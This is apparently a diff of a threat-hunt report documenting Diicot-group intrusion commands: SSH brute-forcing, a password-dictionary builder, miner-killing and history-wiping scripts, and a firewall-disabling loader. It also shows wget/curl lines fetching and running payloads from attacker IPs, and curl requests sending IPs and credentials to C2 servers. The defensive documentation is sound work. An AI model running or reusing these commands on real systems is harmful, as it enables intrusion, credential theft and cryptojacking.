@@ -5,11 +5,11 @@ Each command is linked from the findings sections for clarity and deeper technic
 
 ---
 
-# 📂 Initial Threat Hunt Observations
+# Initial Threat Hunt Observations
 
 ---
 
-## 🧩 .bisis SSH Brute-Force Command
+## .bisis SSH Brute-Force Command
 (id: `bisis-ssh-brute-force-command`)
 
 ```bash
@@ -25,7 +25,7 @@ Uses a timeout of 8 seconds per connection attempt and references an external co
 
 ---
 
-## 🧩 .bisis Repeated Execution Command
+## .bisis Repeated Execution Command
 (id: `bisis-repeated-execution-command`)
 
 ```bash
@@ -46,7 +46,7 @@ Launches `.bisis` with customized parameters (threads, timeout, SSH port, userna
 
 ---
 
-## 🧩 ./network Multi-Stage Crypto Mining Script
+## ./network Multi-Stage Crypto Mining Script
 (id: `network-multistage-script`)
 
 ```bash
@@ -81,7 +81,7 @@ Complex script to eliminate competition, hide traces, deploy mining payloads, an
 
 ---
 
-## 🧩 `retea` Full Payload Script  
+## ./retea Full Payload Script
 (id: `retea-full-payload-script`)
 
 ```bash
@@ -133,36 +133,36 @@ pasus=.usrs
 check=`grep -c . .usrs`
 
 for us in $(cat $pasus); do
-  printf "$us $us\n" >> pass
-  printf "$us ${us}$us\n" >> pass
-  printf "$us ${us}123\n" >> pass
-  printf "$us ${us}123456\n" >> pass
-  printf "$us 123456\n" >> pass
-  printf "$us 1\n" >> pass
-  printf "$us 12\n" >> pass
-  printf "$us 123\n" >> pass
-  printf "$us 1234\n" >> pass
-  printf "$us 12345\n" >> pass
-  printf "$us 12345678\n" >> pass
-  printf "$us 123456789\n" >> pass
-  printf "$us 123.com\n" >> pass
-  printf "$us 123456.com\n" >> pass
-  printf "$us 123\n" >> pass
-  printf "$us 1qaz@WSX\n" >> pass
-  printf "$us ${us}@123\n" >> pass
-  printf "$us ${us}@1234\n" >> pass
-  printf "$us ${us}@123456\n" >> pass
-  printf "$us ${us}123\n" >> pass
-  printf "$us ${us}1234\n" >> pass
-  printf "$us ${us}123456\n" >> pass
-  printf "$us qwer1234\n" >> pass
-  printf "$us 111111\n" >> pass
-  printf "$us Passw0rd\n" >> pass
-  printf "$us P@ssw0rd\n" >> pass
-  printf "$us qaz123!@#\n" >> pass
-  printf "$us !@#\n" >> pass
-  printf "$us password\n" >> pass
-  printf "$us Huawei@123\n" >> pass
+  printf "$us $us\\n" >> pass
+  printf "$us ${us}$us\\n" >> pass
+  printf "$us ${us}123\\n" >> pass
+  printf "$us ${us}123456\\n" >> pass
+  printf "$us 123456\\n" >> pass
+  printf "$us 1\\n" >> pass
+  printf "$us 12\\n" >> pass
+  printf "$us 123\\n" >> pass
+  printf "$us 1234\\n" >> pass
+  printf "$us 12345\\n" >> pass
+  printf "$us 12345678\\n" >> pass
+  printf "$us 123456789\\n" >> pass
+  printf "$us 123.com\\n" >> pass
+  printf "$us 123456.com\\n" >> pass
+  printf "$us 123\\n" >> pass
+  printf "$us 1qaz@WSX\\n" >> pass
+  printf "$us ${us}@123\\n" >> pass
+  printf "$us ${us}@1234\\n" >> pass
+  printf "$us ${us}@123456\\n" >> pass
+  printf "$us ${us}123\\n" >> pass
+  printf "$us ${us}1234\\n" >> pass
+  printf "$us ${us}123456\\n" >> pass
+  printf "$us qwer1234\\n" >> pass
+  printf "$us 111111\\n" >> pass
+  printf "$us Passw0rd\\n" >> pass
+  printf "$us P@ssw0rd\\n" >> pass
+  printf "$us qaz123!@#\\n" >> pass
+  printf "$us !@#\\n" >> pass
+  printf "$us password\\n" >> pass
+  printf "$us Huawei@123\\n" >> pass
 done
 
 wait
@@ -170,8 +170,7 @@ sleep 0.5
 cat bios.txt | sort -R | uniq > i
 cat i > bios.txt
 
-./network "rm -rf /var/tmp/Documents ; mkdir /var/tmp/Documents 2>&1 ; crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr -iae /var/tmp/Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ; pkill xmrig ; killall cnrig ; killall xmrig ; cd /var/tmp/ ; mv /var/tmp/diicot /var/tmp/Documents/.diicot ; mv /var/tmp/kuak /var/tmp/Documents/kuak ; cd /var/tmp/Documents ; chmod +x .* ; /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history ; rm -rf /tmp/cache ; cd /tmp/ ; wget -q 85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu ; mv .balu cache ; chmod +x cache ; ./cache >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history"
-
+./network "... (same full command as earlier) ..."
 sleep 25
 
 function Miner {
@@ -182,81 +181,36 @@ function Miner {
 }
 Miner
 ' ./retea KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU Haceru
-“
 ```
-
-
-**Description:**  
-A full attack script associated with the `retea` payload. It builds a large password dictionary from system users, kills competing miners, downloads new malware, executes hidden binaries, and prepares the system for continued brute-force and mining activity.
-
-
 
 **Description:**  
 Malicious script associated with the Diicot group; collects system info, builds credential dictionaries, wipes traces, downloads and executes secondary payloads.
 
 ---
 
-## 🧩 ./UpzBUBnv Suspicious Binary Execution
-(id: `upzbubnv-execution`)
-
+## ./UpzBUBnv Suspicious Binary Execution
 ```bash
 ./UpzBUBnv
 ```
 
-**Description:**  
-Hidden binary executed post-SSH connection; suspected malware based on behavior and association with SSH brute-force processes.
-
----
-
-## 🧩 ./cache Crypto Miner Execution
-(id: `cache-miner-execution`)
-
+## ./cache Crypto Miner Execution
 ```bash
 ./cache
 ```
 
-**Description:**  
-Executable dropped from remote source, tied to crypto mining operations in the compromised network.
-
----
-
-# 📂 MDE Dashboard Review Observations
-
----
-
-## 🧩 curl Silent Data Exfiltration to C2
-(id: `curl-silent-c2`)
-
+## curl Silent Data Exfiltration to C2
 ```bash
 curl --silent "http://196.251.73.38:47/save-data?IP=45.64.186.20" \
-  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
-  -H "Accept-Language: en-US,en;q=0.9" \
-  -H "Cache-Control: max-age=0" \
-  -H "Connection: keep-alive" \
-  -H "Upgrade-Insecure-Requests: 1" \
+  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" \
   --insecure
 ```
 
 **Description:**  
-Sends infected system's IP address to remote C2 server silently; uses browser headers to evade basic detection.
+Silent HTTP request to a C2 server transmitting the victim system’s IP. Uses `--silent` and browser-like headers to mimic legitimate traffic and evade detection; `--insecure` bypasses certificate validation.
 
 ---
 
-## 🧩 curl Downloading Malicious Payload (Black3)
-(id: `curl-black3-download`)
-
-```bash
-curl -s --connect-timeout 15 digital.digitaldatainsights.org/.x/black3
-```
-
-**Description:**  
-Silent download of suspected malicious payload (.x/black3) from known-malicious domain associated with Diicot group activity.
-
----
-
-## 🧩 bash-based Firewall Disabling and Malware Loader
-(id: `bash-firewall-disable-loader`)
-
+## bash-based Firewall Disabling and Malware Loader
 ```bash
 bash -c "
   pkill firewalld -9;
@@ -287,31 +241,24 @@ bash -c "
 ```
 
 **Description:**  
-Full disablement of firewall protections, retrieval and execution of multiple payloads, heavy use of log wiping to cover tracks.
+Heavily obfuscated loader script that disables firewalls, removes logs, and fetches payloads via HTTP and TFTP. It aggressively wipes shell history and artifacts to maximize stealth.
 
 ---
 
-## 🧩 curl Credential and System Info Exfiltration
-(id: `curl-credential-exfil`)
-
+## curl Credential and System Info Exfiltration
 ```bash
-curl --silent "http://87.120.116.35:8000/save-data?IP=54.177.195.166&USER=user1&PASS=*****&PORT=22&CPUS=4&HOSTN=awk: command not found&ARCHN=awk: command not found&KERN=awk: command not found&GPU=No" \
-  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
-  -H "Accept-Language: en-US,en;q=0.9" \
-  -H "Cache-Control: max-age=0" \
-  -H "Connection: keep-alive" \
-  -H "Upgrade-Insecure-Requests: 1" \
+curl --silent "http://87.120.116.35:8000/save-data?IP=54.177.195.166&USER=user1&PASS=*****&PORT=22" \
   --insecure
 ```
 
 **Description:**  
-Exfiltrates host metadata, usernames, credentials, and hardware details to remote malicious server over insecure connection.
+Sensitive data—IP, username, password, and SSH port—is exfiltrated over unencrypted HTTP. The `--silent` and `--insecure` flags suppress output and bypass TLS checks to evade detection.
 
----
 
-# 📜 Notes
 
-- Commands above were collected from both manual threat hunting and MDE incident dashboard review.
-- Diicot threat group indicators dominate most stages of the attack lifecycle.
-- Each script or command had a distinct role: reconnaissance, brute-force, persistence, cryptomining, or exfiltration.
+
+
+
+
+
 
